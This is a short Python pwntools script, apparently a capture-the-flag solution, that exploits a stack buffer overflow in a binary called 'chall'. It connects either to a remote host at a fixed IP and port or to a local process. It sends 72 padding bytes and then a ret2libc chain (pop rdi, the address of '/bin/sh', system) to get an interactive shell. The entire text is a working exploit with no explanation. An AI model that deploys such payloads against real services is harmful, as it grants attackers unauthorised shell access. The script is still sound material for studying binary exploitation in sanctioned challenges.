from pwn import *

if args.REMOTE:
    p =  remote("4.224.22.66", 7890)
    elf = ELF("chall")
    libc = ELF("libc.so.6")
    libc.address = 0x00007ffff79e2000
else:
    p = process("./chall")
    elf = ELF("chall")
    libc = elf.libc
    libc.address = 0x00007ffff7de8000

pop_rdi = 0x00000000004011fb

p.recvline()
p.recvline()


payload = b"A"*72
payload += p64(pop_rdi)
payload += p64(next(libc.search(b"/bin/sh\x00")))
payload += p64(libc.symbols['system'])

pause()
p.sendline(payload)
p.interactive()
